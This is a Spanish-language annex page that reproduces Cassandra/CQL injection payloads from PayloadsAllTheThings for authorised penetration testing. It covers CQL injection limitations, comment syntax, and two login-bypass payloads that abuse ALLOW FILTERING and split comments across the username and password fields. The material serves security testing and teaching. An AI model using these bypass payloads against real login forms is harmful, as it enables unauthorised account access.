# SQL injection: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [SQL Injection/Cassandra Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/SQL%20Injection/Cassandra%20Injection.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Cassandra Inyección / CQL Inyección Limitations

### Variantes presentes en tablas o texto del apartado

```text
UNION
DATABASE()
USER()
OR
SELECT * FROM table WHERE col1='a' OR col2='b';
SLEEP()
SELECT * FROM table WHERE column=(SELECT column FROM table LIMIT 1);
```

## 2. Cassandra Inyección / Cassandra Comment

```sql
/* Cassandra Comment */
```

## 3. Cassandra Login Evasión / Ejemplo #1

```sql
username: admin' ALLOW FILTERING; %00
password: ANY
```

## 4. Cassandra Login Evasión / Ejemplo #2

```sql
username: admin'/*
password: */and pass>'
```

```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
